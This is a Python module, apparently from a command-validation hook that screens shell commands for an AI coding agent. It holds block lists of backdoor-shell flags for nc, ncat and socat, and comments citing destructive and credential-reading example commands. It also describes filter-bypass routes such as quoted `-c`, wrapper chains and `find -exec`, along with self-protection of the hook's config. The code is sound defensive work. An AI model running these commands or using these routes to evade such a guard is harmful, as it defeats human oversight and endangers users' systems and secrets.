"""Command validation orchestrator.

This module orchestrates the validation flow, integrating the parser,
rule engine, and cache. It provides the main validate_command() API and
handles configuration layering (plugin defaults → user → project).
"""

import logging
import posixpath
import re
import subprocess
import threading
from dataclasses import dataclass, field, replace
from pathlib import Path
from typing import Any, Optional

import yaml

from schlock.exceptions import ConfigurationError, ParseError
from schlock.integrations.commit_filter import MAX_COMMAND_SIZE
from schlock.integrations.shellcheck import (
    get_security_findings,
    is_shellcheck_available,
    run_shellcheck,
)

from .cache import ValidationCache
from .parser import WRAPPER_COMMANDS, BashCommandParser
from .rules import RiskLevel, RuleEngine, RuleMatch, SecurityRule
from .substitution import SubstitutionValidationResult, SubstitutionValidator

logger = logging.getLogger(__name__)


# Module-level cache (shared across all validation calls)
_global_cache = ValidationCache(max_size=1000)
# Which ruleset produced the entries currently in _global_cache. Deliberately not
# _global_rule_engine_path: that records which engine is LOADED, and call sites that never
# touch this cache advance it (LAB-4602).
_global_cache_path: Optional[str] = None

# Thread lock for RuleEngine and Parser caches
# SECURITY: Prevents race conditions when multiple threads access shared state
# NOTE: RLock (reentrant lock) allows the same thread to acquire the lock multiple times.
# This is necessary because _get_substitution_validator() calls _get_parser() and
# _get_rule_engine(), which also acquire the lock.
_cache_lock = threading.RLock()

# Module-level RuleEngine cache (avoid reloading YAML + recompiling regex on every call)
# PERF: Rule loading takes ~160ms - caching reduces cache-miss latency from 180ms to 20ms
_global_rule_engine: Optional["RuleEngine"] = None
_global_rule_engine_path: Optional[str] = None  # Track config path to invalidate on change

# Module-level parser cache (BashCommandParser is stateless, reuse it)
_global_parser: Optional["BashCommandParser"] = None

# Module-level SubstitutionValidator cache
_global_substitution_validator: Optional["SubstitutionValidator"] = None


def _get_rule_engine(config_path: Optional[str] = None) -> "RuleEngine":
    """Get cached RuleEngine or create new one.

    PERF: Caches the RuleEngine to avoid reloading YAML and recompiling
    regex patterns on every validation call (~160ms savings per cache miss).

    Thread-safe: Uses _cache_lock to prevent race conditions.

    Args:
        config_path: Optional path to rules (for testing). Different paths
                    get different cached engines.

    Returns:
        Cached or newly created RuleEngine
    """
    global _global_rule_engine, _global_rule_engine_path  # noqa: PLW0603

    with _cache_lock:
        # Check if we can reuse cached engine
        if _global_rule_engine is not None and _global_rule_engine_path == config_path:
            return _global_rule_engine

        # Load new engine and cache it
        _global_rule_engine = load_rules(config_path)
        _global_rule_engine_path = config_path
        return _global_rule_engine


def _invalidate_on_ruleset_change(config_path: Optional[str] = None) -> None:
    """Retire every piece of ruleset-derived state when the requested ruleset is not its own.

    ValidationCache keys on the command string alone, so without this the first ruleset to
    validate a command owns that command's verdict for the rest of the process: a later call
    naming a different ruleset gets a hit computed under rules it never asked for. Silent, and
    it inverts mutation testing - revert a pattern, re-run, and the reverted ruleset still
    appears to deny (LAB-4602).

    Placement is load-bearing: this must run BEFORE validate_command's Step-1 lookup.
    _get_rule_engine() does reload on a path change, but it runs after the lookup has already
    returned the stale hit, so the same compare placed there never fires.

    Clearing the verdict cache alone is not enough on its own: the substitution layer holds
    its own ruleset-derived state. That is fixed where it lives, in _get_substitution_validator
    - see its docstring - rather than by reaching across from here, so it also holds for
    callers that never come through validate_command.
    """
    global _global_cache_path  # noqa: PLW0603

    # Re-check under the lock: the caller's guard is deliberately unlocked (it runs before
    # every cache hit), so another thread may have switched the ruleset between that compare
    # and this one. Together the two form one double-checked lock.
    #
    # ponytail: the ceiling is write-after-clear, not just a stale read. validate_command's
    # Step-7 _global_cache.set() is outside this lock and is never re-guarded, so a call
    # already in flight under the old ruleset can land its verdict AFTER this clear has moved
    # the marker - and because the marker then matches, no later clear can evict it. Test-only
    # (production is one hook process holding one ruleset, and no concurrent multi-ruleset
    # caller exists), and the engine singleton is already racy the same way. To close it,
    # snapshot the marker before Step 5 and skip the Step-7 set when it moved.
    with _cache_lock:
        if _global_cache_path != config_path:
            _global_cache.clear()
            _global_cache_path = config_path


def _get_parser() -> "BashCommandParser":
    """Get cached BashCommandParser.

    PERF: Parser is stateless, reuse the same instance.
    Thread-safe: Uses _cache_lock to prevent race conditions.
    """
    global _global_parser  # noqa: PLW0603

    with _cache_lock:
        if _global_parser is None:
            _global_parser = BashCommandParser()
        return _global_parser


def _get_substitution_validator(config_path: Optional[str] = None) -> "SubstitutionValidator":
    """Get a SubstitutionValidator bound to the CURRENT rule engine.

    PERF: SubstitutionValidator caches whitelist lookups.
    Thread-safe: Uses _cache_lock to prevent race conditions.

    Rebuilds whenever the engine changes, not only on first use. This used to cache on
    `is None` alone and ignore config_path forever after, so once the ruleset changed it
    kept vouching with the PREVIOUS ruleset's engine - and this layer is whitelist-first
    default-deny, so a stale whitelist admits commands the named ruleset denies
    (`echo "$(cat ~/.kube/config | head)"` came back SAFE under a ruleset that blocks it).

    Keyed on the engine OBJECT, not on a second config_path global: _get_rule_engine already
    owns that decision, and an identity check cannot drift out of sync with it. It also
    covers callers that reach this function directly rather than through validate_command -
    tests/test_walker_parity.py does exactly that (LAB-4602).
    """
    global _global_substitution_validator  # noqa: PLW0603

    with _cache_lock:
        engine = _get_rule_engine(config_path)
        if _global_substitution_validator is None or _global_substitution_validator.rule_engine is not engine:
            _global_substitution_validator = SubstitutionValidator(_get_parser(), engine)
        return _global_substitution_validator


@dataclass(frozen=True)
class ValidationResult:
    """Result of command validation.

    Immutable result containing validation outcome and metadata.

    Attributes:
        allowed: Whether command is allowed to execute
        risk_level: Risk level of the command (SAFE to BLOCKED)
        message: Human-readable explanation
        alternatives: List of safer alternative approaches
        exit_code: 0 if allowed, 1 if blocked
        error: Error message if validation failed (None on success)
        matched_rules: List of rule names that matched (for audit logging)

    Example:
        >>> result = validate_command("rm -rf /")
        >>> if not result.allowed:
        ...     print(f"Blocked: {result.message}")
        ...     for alt in result.alternatives:
        ...         print(f"  Try: {alt}")
    """

    allowed: bool
    risk_level: RiskLevel
    message: str
    alternatives: list[str] = field(default_factory=list)
    exit_code: int = 0
    error: Optional[str] = None
    matched_rules: list[str] = field(default_factory=list)


def _extract_whitelist_patterns(data: dict, config_path: Path, is_user_level: bool) -> list[str]:
    """Extract whitelist patterns from a parsed config file.

    SECURITY: Only user-level config may define whitelist patterns.
    Project-level config is rejected with a warning.
    """
    if not is_user_level:
        if data.get("whitelist"):
            logger.warning(
                f"Ignoring whitelist patterns in project config {config_path} "
                "(whitelist is only supported in user-level config ~/.config/schlock/config.yaml)"
            )
        return []

    file_whitelist = data.get("whitelist", [])
    if not isinstance(file_whitelist, list):
        if file_whitelist:
            logger.warning(f"Ignoring non-list whitelist value in {config_path}")
        return []

    patterns: list[str] = []
    for pattern in file_whitelist:
        if isinstance(pattern, str):
            patterns.append(pattern)
        else:
            logger.warning(f"Skipping non-string whitelist pattern in {config_path}: {pattern!r}")
    return patterns


def _load_rule_overrides() -> tuple[dict, dict, list[str]]:
    """Load rule/category overrides and whitelist patterns from config files.

    Reads config from both paths in precedence order (user first, project second).
    Project-level overrides win at the property level (not dict-level replace).

    SECURITY: Whitelist patterns are loaded from user-level config ONLY.
    Project-level config cannot define whitelist patterns because whitelist
    bypasses ALL rules including BLOCKED — a malicious repo could exploit this.

    Returns:
        Tuple of (rule_overrides, category_overrides, whitelist_patterns).
        Empty dicts/list if none found. Never raises exceptions.
    """
    rule_overrides: dict = {}
    category_overrides: dict = {}
    whitelist_patterns: list[str] = []

    # Config paths: (path, is_user_level) in priority order (lowest first)
    # Path.home() can raise RuntimeError (HOME unset, e.g. containers/CI)
    # Path.cwd() can raise FileNotFoundError (cwd deleted)
    config_paths: list[tuple[Path, bool]] = []
    try:
        config_paths.append((Path.home() / ".config" / "schlock" / "config.yaml", True))
    except Exception as e:
        logger.warning(f"Cannot resolve home directory for user config: {e}")
    try:
        config_paths.append((Path.cwd() / ".claude" / "hooks" / "schlock-config.yaml", False))
    except Exception as e:
        logger.warning(f"Cannot resolve working directory for project config: {e}")

    for config_path, is_user_level in config_paths:
        try:
            if not config_path.exists():
                continue

            with open(config_path, encoding="utf-8") as f:
                data = yaml.safe_load(f)

            if not isinstance(data, dict):
                continue

            # Merge rule_overrides (property-level: per-rule keys merge, per-property overwrites)
            file_rule_overrides = data.get("rule_overrides", {})
            if isinstance(file_rule_overrides, dict):
                for rule_name, props in file_rule_overrides.items():
                    if isinstance(props, dict):
                        rule_overrides.setdefault(rule_name, {}).update(props)

            # Merge category_overrides (same property-level merge)
            file_category_overrides = data.get("category_overrides", {})
            if isinstance(file_category_overrides, dict):
                for cat_name, props in file_category_overrides.items():
                    if isinstance(props, dict):
                        category_overrides.setdefault(cat_name, {}).update(props)

            # Whitelist patterns (user-level only, see _extract_whitelist_patterns)
            whitelist_patterns.extend(_extract_whitelist_patterns(data, config_path, is_user_level))

        except Exception as e:
            logger.warning(f"Failed to load overrides from {config_path}: {e}")
            continue

    return rule_overrides, category_overrides, whitelist_patterns


def load_rules(config_path: Optional[str] = None) -> RuleEngine:
    """Load rules from the canonical data/rules/ directory.

    Configuration layers (later overrides earlier):
    1. Plugin defaults: data/rules/ directory (required)
    2. User overrides: Platform-specific config directory (optional, future feature)
    3. Project overrides: .claude/hooks/schlock-config.yaml (optional)

    Args:
        config_path: Optional path to rules file or directory (for testing/override)

    Returns:
        RuleEngine loaded with merged configuration

    Raises:
        ConfigurationError: If plugin defaults are missing or invalid
    """
    if config_path:
        # Testing/override path - handle both file and directory
        path = Path(config_path)
        if path.is_dir():
            return RuleEngine.from_directory(path)
        return RuleEngine(config_path)

    # Default: load from data/rules/ directory
    # Path: core/validator.py -> core -> schlock -> src -> project_root
    project_root = Path(__file__).parent.parent.parent.parent
    rules_dir = project_root / "data" / "rules"

    if not rules_dir.exists() or not rules_dir.is_dir():
        raise ConfigurationError(
            f"Plugin defaults not found at {rules_dir}/. This is a fatal error - plugin installation may be corrupted.",
            file_path=str(rules_dir),
        )

    logger.info(f"Loading rules from directory: {rules_dir}")
    engine = RuleEngine.from_directory(rules_dir)

    # Apply user/project overrides (only for default path, not test overrides)
    rule_overrides, category_overrides, whitelist_patterns = _load_rule_overrides()
    if rule_overrides or category_overrides:
        engine.apply_overrides(rule_overrides, category_overrides)

    # Apply user whitelist patterns (user-level config only, see _load_rule_overrides)
    # Compile each pattern independently so one bad regex doesn't drop the rest.
    for pattern in whitelist_patterns:
        try:
            engine._compile_whitelist([pattern])
        except ConfigurationError as e:
            logger.warning(f"Invalid whitelist pattern in user config, skipping: {e}")

    return engine


# SECURITY: Dangerous command + flag combinations that must be blocked regardless of quoting
# These are commands where specific flags enable arbitrary code execution or backdoors
# AST-based detection catches quoted commands that bypass regex patterns (e.g., "nc" -e)
DANGEROUS_COMMAND_FLAGS: dict[str, tuple[list[str], str, list[str]]] = {
    # Network backdoors - BLOCKED level
    "nc": (
        ["-e", "-c"],  # Execute flag variants
        "Netcat backdoor: -e/-c flags execute arbitrary commands",
        ["Use SSH for secure remote access", "Use proper remote administration tools"],
    ),
    "ncat": (
        ["--exec", "--sh-exec", "-e", "-c"],
        "Ncat backdoor: exec flags execute arbitrary commands",
        ["Use SSH for secure remote access", "Use proper remote administration tools"],
    ),
    "netcat": (
        ["-e", "-c"],
        "Netcat backdoor: -e/-c flags execute arbitrary commands",
        ["Use SSH for secure remote access", "Use proper remote administration tools"],
    ),
    "socat": (
        ["EXEC:", "SYSTEM:"],
        "Socat execution: EXEC/SYSTEM can execute arbitrary commands",
        ["Use SSH for secure remote access", "Use proper remote administration tools"],
    ),
}


def _check_dangerous_command_flags(
    commands_with_args: list[tuple[str, list[str]]],
) -> Optional[ValidationResult]:
    """Check for dangerous command + flag combinations using pure AST extraction.

    SECURITY CRITICAL: Uses bashlex AST for ALL parsing - both command names AND
    arguments. This ensures consistent security-critical parsing throughout the
    validation engine without regex shortcuts.

    Bashlex strips quotes during AST parsing, so:
    - "nc" -e /bin/bash → command='nc', args=['-e', '/bin/bash']
    - 'socat' EXEC:/bin/sh → command='socat', args=['EXEC:/bin/sh']

    Args:
        commands_with_args: List of (command_name, [args]) tuples from AST

    Returns:
        ValidationResult if dangerous combo found, None otherwise
    """
    for cmd_name, args in commands_with_args:
        # Strip path prefix (e.g., /usr/bin/nc -> nc)
        base_name = cmd_name.split("/")[-1] if "/" in cmd_name else cmd_name

        if base_name in DANGEROUS_COMMAND_FLAGS:
            flags, description, alternatives = DANGEROUS_COMMAND_FLAGS[base_name]
            # Check if any dangerous flag is present in AST-extracted args
            for arg in args:
                for flag in flags:
                    if flag.endswith(":"):
                        # Protocol-style flag (EXEC:, SYSTEM:) - case insensitive
                        # Check if arg starts with the protocol prefix
                        if arg.lower().startswith(flag.lower()):
                            return ValidationResult(
                                allowed=False,
                                risk_level=RiskLevel.BLOCKED,
                                message=f"BLOCKED: {description}",
                                alternatives=alternatives,
                                exit_code=1,
                                error=None,
                                matched_rules=[f"ast_dangerous_combo:{base_name}"],
                            )
                    # Flag-style (-e, --exec) - exact match or inline syntax (--exec=)
                    elif arg == flag or (flag.startswith("-") and arg.startswith(f"{flag}=")):
                        return ValidationResult(
                            allowed=False,
                            risk_level=RiskLevel.BLOCKED,
                            message=f"BLOCKED: {description}",
                            alternatives=alternatives,
                            exit_code=1,
                            error=None,
                            matched_rules=[f"ast_dangerous_combo:{base_name}"],
                        )

        # git -c config keys that execute arbitrary commands (top-level parity with the
        # SubstitutionValidator check). Lazy import avoids the documented substitution<->validator
        # mutual-import hazard.
        if base_name == "git":
            from schlock.core.substitution import dangerous_git_config  # noqa: PLC0415

            git_reason = dangerous_git_config(args)
            if git_reason:
                return ValidationResult(
                    allowed=False,
                    risk_level=RiskLevel.BLOCKED,
                    message=f"BLOCKED: {git_reason}",
                    alternatives=[
                        "Remove the -c config override",
                        "Avoid git -c keys that execute commands (alias=!cmd, core.*, credential.helper, gpg.program, etc.)",
                    ],
                    exit_code=1,
                    error=None,
                    matched_rules=["ast_dangerous_combo:git"],
                )

    return None


# LAB-2754: commands whose *argument* is a program, not data.
#
# `bash -c "rm -rf /"` hands the quoted word to bash as source code. The AST is right to
# report it as one argument word, but every check downstream of that - the regex rules
# (which match raw source text, where quoting `-c` breaks `\s+-c\s+`) and the string-literal
# suppression - then treats it as an inert string. So `bash "-c" "rm -rf /"` came back SAFE
# while the bare payload was BLOCKED. The fix re-enters validation on the payload.
#
# Shells: `-c PROG` runs PROG, and a LEADING operand is the script to run, which ends option
# parsing (`bash deploy.sh -c production` passes -c to the script, not to bash).
_SHELL_COMMANDS: frozenset[str] = frozenset({"bash", "sh", "zsh", "dash", "ksh", "ash", "csh", "tcsh", "fish", "rbash"})

# Not shells, but their `-c` argument is a command string they hand to one. Their leading
# operand is a user/group/file rather than a script, so it must NOT end option parsing
# (`sg root -c PROG`, `su postgres -c PROG`).
_DASH_C_RUNNERS: frozenset[str] = frozenset({"su", "runuser", "sg", "script"})

_DASH_C_PROGRAM_COMMANDS: frozenset[str] = _SHELL_COMMANDS | _DASH_C_RUNNERS

# Depth cap for re-entering validation on a payload. Reachable in practice only by chaining
# `watch` (shell quoting collapses before `bash -c` can nest this far), so it is a backstop,
# not a hot path. Exceeding it fails closed. Pinned by test_depth_cap_fails_closed.
MAX_SHELL_DELEGATION_DEPTH = 4

# Ceiling on strings schlock DERIVES from an admitted command and re-validates: the heredoc
# rewrite (_neuter_heredocs) and its segments, and delegated payloads. The rewrite inflates —
# each heredoc gains the 15-char placeholder twice plus a blank body line — measured at worst
# 4.62x on a 64 KiB input of minimal `: <<X` heredocs (303,104 chars), and re-neutering is
# idempotent, so no admitted input reaches 8x. The bound is not for today's shapes; it is so a
# future rewrite that DOES compound cannot turn an admitted 64 KiB into an unbounded parse.
# Judging derived text by MAX_COMMAND_SIZE instead denied a 20 KB command for a 66 KB string
# the caller never wrote (LAB-4363).
MAX_DERIVED_COMMAND_SIZE = 8 * MAX_COMMAND_SIZE


def _over_size_ceiling(command: str, *, derived: bool) -> Optional[ValidationResult]:
    """The fail-closed denial for text over its ceiling, or None when it fits.

    ``derived`` selects the bound and, as importantly, the message: a caller told their command
    is too large when the oversized string is schlock's own expansion of it is being lied to.
    """
    limit = MAX_DERIVED_COMMAND_SIZE if derived else MAX_COMMAND_SIZE
    if len(command) <= limit:
        return None
    if derived:
        message = (
            f"Internal expansion of this command reached {len(command)} chars, over schlock's "
            f"{limit} char bound for derived text (the command itself was within the "
            f"{MAX_COMMAND_SIZE} char input limit)"
        )
        alternatives = ["Reduce the number of heredocs or nested shell invocations in one command"]
    else:
        message = f"Command exceeds size limit ({len(command)} > {limit} chars)"
        alternatives = ["Split the command into smaller invocations"]
    return ValidationResult(
        allowed=False,
        risk_level=RiskLevel.BLOCKED,
        message=message,
        alternatives=alternatives,
        exit_code=1,
    )


# Ceiling on distinct (command, tail) suffixes one top-level extraction may visit. Legitimate
# commands need a few dozen at most. Past it the command is adversarial and extraction fails
# CLOSED: the extractor raises, validate_command's catch-all returns BLOCKED, the hook denies.
# Needed because the per-call memo bounds ONE wrapper chain, not k independent chains with
# distinct tails, so total work still grew with command size - and a PreToolUse hook that
# outlives its timeout fails OPEN. Pinned by test_sibling_chains_past_the_ceiling_fail_closed.
# ponytail: each suffix costs O(len) for the `args[i+1:]` slice + tuple key, so the worst case
# under this ceiling is ~0.2 s (measured); index-based re-entry would make it O(1) if needed.
MAX_DELEGATOR_TOKENS = 256

# `watch`'s own options. Only these consume a following word; everything after the option run
# belongs to the command. Getting this wrong over-approximates (an option value is prepended to
# the program), which is the safe direction.
_WATCH_VALUE_OPTIONS: frozenset[str] = frozenset({"-n", "--interval"})

# `find`'s clauses that run an external command. Everything up to the terminating `;`/`+` is
# that command, and the shell inside it is a delegator find never names as a command itself.
_FIND_EXEC_FLAGS: frozenset[str] = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
# find's own getopt: `-exec CMD ;` runs CMD once per file, `-exec CMD +` once with all files.
# A bare `;` is a bash separator (never reaches find's args); an escaped `\;` or quoted `';'`
# survives as this literal word, as does `+`. All three end the clause.
_FIND_EXEC_TERMINATORS: frozenset[str] = frozenset({";", "+"})

# Every base name the extractor itself knows how to unwrap. The wrapper branch re-enters the
# extractor on each arg that names one of these (LAB-3004), so runner operand semantics,
# `watch`, `find -exec`, and nested wrappers thread identically to the bare spelling instead of
# being re-implemented in the wrapper branch. The union of all four recognized-command sets is
# deliberate: WRAPPER_COMMANDS lets a nested wrapper be skipped past, the program/watch/find
# members let the wrapped target be found; a member matched sooner only recurses earlier, it
# can never make the scan miss. su/sg/runuser happen to sit in both unioned sets.
_DELEGATOR_COMMANDS: frozenset[str] = _DASH_C_PROGRAM_COMMANDS | WRAPPER_COMMANDS | frozenset({"watch", "find"})


def _find_exec_clauses(args: list[str]) -> list[list[str]]:
    """Return each `find -exec/-execdir/-ok/-okdir` clause's sub-command words.

    `find`'s exec clause is opaque `args` to find, so the shell it launches (`-exec bash -c
    PROG`) is invisible to the delegator scan. Each returned word list is a synthetic command
    (`[cmd, *args]`) the caller re-enters through the same extraction.

    Only the properly-terminated clause is collected here (`-exec CMD \\;` / `-exec CMD +`,
    where the terminator reaches find as a real `;`/`+` word, and the `;`-per-file default).
    A bare *unescaped* `;` is a bash separator, so a later `-exec ... ;` clause splits off as
    its own command that argv[0]=`-exec` makes `command not found` - it never runs the payload,
    so it is deliberately not chased. A dangerous *first* clause still reaches find's own args
    and is caught here.

    `{}` is a filename find substitutes at run time, not code; it is passed through verbatim
    and only matters if it feeds a delegator, which it never does on its own.
    """
    clauses: list[list[str]] = []
    i = 0
    while i < len(args):
        if args[i] not in _FIND_EXEC_FLAGS:
            i += 1
            continue
        i += 1  # step past the exec flag onto the sub-command
        clause: list[str] = []
        while i < len(args) and args[i] not in _FIND_EXEC_TERMINATORS:
            clause.append(args[i])
            i += 1
        if clause:
            clauses.append(clause)
    return clauses


def _dash_c_payload(words: list[str], *, operand_ends_options: bool = True) -> Optional[str]:
    """Return the program a `-c` hands to a shell, given the words following the command name.

    The shell's own getopt is the specification, and it says the program is always the NEXT
    word: `bash -cecho` is "option requires an argument", not inline code, and `bash -ce PROG`
    runs PROG (both verified against bash/dash/zsh). So a clustered `c` never consumes the
    rest of its own cluster - reading `-ce PROG` as the program "e" was a hole, not a shortcut.

    A `--` between `-c` and the program is skipped, because the shell skips it too
    (`bash -c -- 'echo hi'` prints hi). A `--` *before* any `-c` ends option parsing, so
    there is no inline program at all.
    """
    for i, word in enumerate(words):
        if word == "--":
            return None  # end of options: a later -c is an argument, not a flag
        if not word.startswith("-"):
            # For a shell, a leading operand is the script to run, so no -c can follow it. For
            # `su`/`sg`/`runuser` it is a user or group and options continue after it. Once an
            # option has been seen a bare token is that option's value either way - keep
            # scanning. Same reading as parser._reads_stdin_as_program.
            if i == 0 and operand_ends_options:
                return None
            continue
        if word.startswith("--") or "c" not in word[1:]:
            continue
        rest = words[i + 1 :]
        while rest and rest[0] == "--":
            rest = rest[1:]
        return rest[0] if rest else None
    return None


def _watch_payload(args: list[str]) -> Optional[str]:
    """Return the command `watch` will run, verbatim.

    `watch` execs its command through `sh -c`, so the flags belong to the *program* and must
    survive: dropping every dashed word turned `watch -n 5 rm -rf /` into `rm /` and
    `watch -- git -c core.pager=/bin/sh log` into a form that no longer trips the git check.
    """
    i = 0
    while i < len(args) and args[i].startswith("-"):
        if args[i] == "--":
            i += 1
            break
        if args[i] in _WATCH_VALUE_OPTIONS:
            i += 1
        i += 1
    return " ".join(args[i:]) or None


def _shell_delegated_payloads(
    commands_with_args: list[tuple[str, list[str]]],
    *,
    _seen: Optional[set[tuple[str, tuple[str, ...]]]] = None,
) -> list[str]:
    """Extract every argument the command will hand to a shell as source code.

    Covers `<shell> -c PROG`, the same behind an exec wrapper (`sudo`, `timeout 5`,
    `env FOO=1`, `busybox`, `flock ...`), `watch PROG`, and `find -exec/-execdir/-ok/-okdir
    <shell> -c PROG ;` (LAB-2767), whose clause re-enters this same extraction.

    Here-strings (`bash <<< "..."`) ride a redirect node the word-walker never sees, so they
    are surfaced by `parser.extract_stdin_program_redirects` instead and fed into the same
    Step 5c re-entry as these payloads (LAB-2768).

    Deliberately NOT covered, each tracked separately: remote delegation (`ssh host "..."`,
    a different trust domain) and non-shell interpreters (`python3 -c`, `perl -e`) whose
    payload is not bash and would be nonsense to re-validate as bash. WRAPPER_COMMANDS is
    best-effort, not an exhaustive enumeration of every exec-passthrough binary.

    A first word that is neither a delegator nor a wrapper is never scanned, so
    `echo bash -c "rm -rf /"` (which prints the string) and `grep -c pattern file` are untouched.

    Raises ValueError past MAX_DELEGATOR_TOKENS distinct suffixes (fail closed, see there).
    """
    # Each (command, tail) suffix is extracted at most once per top-level call. The wrapper
    # branch below re-enters on EVERY delegator position and each re-entry rescans its own tail,
    # so without this a chain of n wrappers (`sudo sudo ... bash -c PROG`) visited every subset
    # of positions: 2^n calls, 2^(n-1) copies of PROG, each then re-validated. A visited suffix
    # has already handed its payloads up through the call that first reached it, so skipping it
    # drops nothing: n distinct suffixes each scanned once, O(n^2) calls in total (the rest are
    # O(1) skips). Pinned by test_repeated_wrappers_extract_each_suffix_once.
    seen = set() if _seen is None else _seen
    payloads = []
    for cmd_name, args in commands_with_args:
        key = (cmd_name, tuple(args))
        if key in seen:
            continue
        seen.add(key)
        if len(seen) > MAX_DELEGATOR_TOKENS:
            raise ValueError(f"Shell delegation scan exceeded {MAX_DELEGATOR_TOKENS} delegator tokens")
        base = cmd_name.rsplit("/", 1)[-1]
        found = []

        if base == "watch":
            found.append(_watch_payload(args))
        elif base == "find":
            # Each exec clause is a command in its own right; re-run the FULL extractor on it,
            # so a wrapped or nested delegator inside `-exec` is caught for free.
            for clause in _find_exec_clauses(args):
                found.extend(_shell_delegated_payloads([(clause[0], clause[1:])], _seen=seen))
        else:
            if base in _DASH_C_PROGRAM_COMMANDS:
                found.append(_dash_c_payload(args, operand_ends_options=base in _SHELL_COMMANDS))
            if base in WRAPPER_COMMANDS:
                # `sudo bash -c ...`, `timeout 5 sg root -c ...`, `timeout 5 watch ...`: re-enter
                # the FULL extractor on every arg position that names a recognized command, so
                # operand semantics, `watch`, `find`, and nested wrappers all thread for free
                # (LAB-3004) — same `(head, tail)` re-entry the `find` branch above uses.
                #
                # EVERY match, not just the first: a wrapper's own operand or option value whose
                # basename collides with a delegator (`flock ./find sh -c PROG`, the lock file
                # basenames to `find`; `strace -o bash sg root -c PROG`, the trace file to `bash`)
                # would otherwise be picked as a decoy that ends the scan and drops the real
                # payload behind it. Re-validating a benign decoy is harmless over-approximation;
                # missing a payload is a bypass. Terminates: each re-entry passes `args[i+1:]`.
                words = [a.rsplit("/", 1)[-1] for a in args]
                for i, word in enumerate(words):
                    if word in _DELEGATOR_COMMANDS:
                        found.extend(_shell_delegated_payloads([(args[i], args[i + 1 :])], _seen=seen))

        payloads.extend(p for p in found if p and p.strip())
    # The same program can still surface from more than one delegator (`su su bash -c PROG`:
    # each `su` owns a -c AND wraps the next). Validating it once is enough.
    return list(dict.fromkeys(payloads))


def _check_contextual_high_risk(
    commands_with_args: list[tuple[str, list[str]]],
) -> Optional[tuple[str, str]]:
    """Return (base_name, reason) for the first kubectl command that modifies cluster state or
    executes code, else None.

    Top-level parity with the SubstitutionValidator kubectl check (which BLOCKs these inside
    `$()`/`<()`). At the top level `kubectl delete`/`apply`/`exec` are common legitimate ops, so the
    caller elevates to HIGH (ask) and lets the preset decide, rather than hard-blocking. Reuses the
    same `dangerous_kubectl` helper as the substitution path.

    NOTE: find is deliberately NOT handled here. The substitution path blocks *any* `find -exec`
    (conservative), but at the top level read-only `find -exec grep/cat/...` is legitimate, so
    top-level find stays command-aware via the `find_exec_dangerous` / `recursive_delete` YAML
    rules (extended to cover -execdir/-ok/-okdir). See #97.
    """
    from schlock.core.substitution import dangerous_kubectl  # noqa: PLC0415

    for cmd_name, args in commands_with_args:
        base_name = cmd_name.split("/")[-1] if "/" in cmd_name else cmd_name
        if base_name != "kubectl":
            continue
        reason = dangerous_kubectl(args)
        if reason:
            return base_name, reason
    return None


# SELF-PROTECTION: Paths that identify schlock configuration files.
# Any command containing these paths is subject to allowlist enforcement.
# Also imported by hooks/pre_tool_use.py for hook-level self-protection.
SELF_PROTECTION_PATHS = ("schlock-config.yaml", ".config/schlock/config.yaml")


def _matches_protected_path(text: str) -> bool:
    """Check if text contains a reference to a protected config path.

    Uses boundary-aware matching to avoid false positives from paths like
    'not-schlock-config.yaml-backup' while still catching paths inside quotes or arguments.
    """
    for path in SELF_PROTECTION_PATHS:
        if path not in text:
            continue
        idx = 0
        while True:
            idx = text.find(path, idx)
            if idx == -1:
                break
            # Character before must be path separator, whitespace, quote, or start
            before_ok = idx == 0 or text[idx - 1] in " \t\n\"'(,;|&>=/"
            # Character after must be whitespace, quote, punctuation, or end
            end = idx + len(path)
            after_ok = end >= len(text) or text[end] in " \t\n\"'(),;|&>"
            if before_ok and after_ok:
                return True
            idx += 1
    return False


# SELF-PROTECTION: Read-only commands allowed to reference config files.
# Allowlist approach: any command NOT in this set is BLOCKED when it references config paths.
# Only inherently read-only commands are included (cannot modify files by design).
_SELF_PROTECTION_READ_ALLOWLIST = frozenset(
    {
        "cat",
        "grep",
        "egrep",
        "fgrep",
        "rg",
        "ag",
        "ack",  # Content viewing/searching
        "ls",
        "dir",
        "stat",
        "file",  # File info
        "head",
        "tail",
        "less",
        "more",
        "bat",
        "view",  # Pagers/viewers
        "wc",
        "md5sum",
        "sha256sum",
        "sha1sum",
        "cksum",  # Measurement
        "diff",
        "cmp",
        "comm",  # Comparison
        "test",
        "[",  # Existence checks
        "basename",
        "dirname",
        "realpath",
        "readlink",  # Path info
        "jq",  # Structured data viewer (stdout only, cannot write files)
    }
)

# Pre-compiled regex for redirect operators targeting config paths
_SELF_PROTECTION_REDIRECT_PATTERNS = [re.compile(r">>?\s*\S*" + re.escape(path)) for path in SELF_PROTECTION_PATHS]

# Pre-compiled regex for splitting command strings into segments
_SEGMENT_SPLIT_RE = re.compile(r"\s*(?:\|(?!\|)|\|\||&&|;)\s*")


# SELF-PROTECTION: Directories that hold schlock configuration files. Extracting an archive
# into one overwrites the config without the config file name ever appearing in the command,
# so the file-name fast path above cannot see it (LAB-4830).
SELF_PROTECTION_DIRS = (".claude/hooks", ".config/schlock")
_CONFIG_DIR_RE = re.compile(r"(?:^|/)(?:" + "|".join(map(re.escape, SELF_PROTECTION_DIRS)) + r")(?:/|$)")
# Leading option name, so "-C.claude/hooks", "-o.claude/hooks", "--directory=x" yield the path.
_OPTION_PREFIX_RE = re.compile(r"^--?[A-Za-z][A-Za-z-]*=?")
# Split a command into shell command-position pieces: real separators, plus the OPENERS of a
# subshell / process substitution, so `echo $(tar … -C .claude/hooks)` exposes tar as a leading
# word. Newline and a lone `&` are separators too, so a config dir named in a *later*, unrelated
# statement never binds to an extractor in an earlier one.
_ARCHIVE_SEGMENT_SPLIT_RE = re.compile(r"\$\(|[`;\n]|\|\|?|&&?|[<>]\(")
# Env assignments prefixing a command ("TAR_OPTIONS=-x tar …") — the command is what follows.
_ARCHIVE_ENV_ASSIGN_RE = re.compile(r'^([A-Za-z_]\w*=(?:"[^"]*"|\'[^\']*\'|\S*)\s+)+')
# A leading redirection token (`>`, `>>`, `2>`, `<`): its target is not an extraction argument.
_REDIRECT_RE = re.compile(r"^\d*(?:>>?|<)")
# Command prefixes that hand off to the next word without changing what it does.
_EXTRACT_WRAPPERS = frozenset({"sudo", "doas", "command", "busybox", "nice", "stdbuf"})
_TAR_NAMES = frozenset({"tar", "gtar", "bsdtar"})
_7Z_NAMES = frozenset({"7z", "7za", "7zr", "7zz"})
# tar short options that consume the NEXT word as their value.
_TAR_ARG_OPTS = frozenset("bCfFgHIKLNTVX")
# tar long options that consume the next word as their value, so "--exclude -t" does not read
